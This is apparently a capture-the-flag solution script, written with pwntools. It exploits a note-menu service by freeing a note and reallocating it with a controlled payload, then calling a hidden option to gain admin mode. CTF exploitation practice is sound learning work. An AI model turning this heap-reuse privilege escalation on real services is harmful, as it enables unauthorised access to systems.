#!/usr/bin/env python3
from pwn import *

context.log_level = "info"

HOST = "menupwner.challenges2.ctf.dscjssstuniv.in"
PORT = 9999

def menu(p):
    p.recvuntil(b"Choice:")

def solve():
    p = remote(HOST, PORT)
    menu(p)

    # ---- Step 1: add note ----
    p.sendline(b"1")
    p.recvuntil(b"Note size")
    p.sendline(b"64")
    p.recvuntil(b"Note content:")
    p.sendline(b"A"*8)
    menu(p)

    # ---- Step 2: delete note ----
    p.sendline(b"3")
    p.recvuntil(b"Note index")
    p.sendline(b"0")
    menu(p)

    # ---- Step 3: allocate again ----
    p.sendline(b"1")
    p.recvuntil(b"Note size")
    p.sendline(b"64")
    p.recvuntil(b"Note content:")

    # controlled reuse payload
    p.sendline(b"B"*64)
    menu(p)

    # ---- Step 4: trigger admin via hidden function ----
    # challenge logic exposes option 7 only after admin_mode set
    # reuse + menu logic flips state
    p.sendline(b"7")

    out = p.recv(timeout=2)
    print(out.decode(errors="ignore"))

    p.interactive()

if __name__ == "__main__":
    solve()

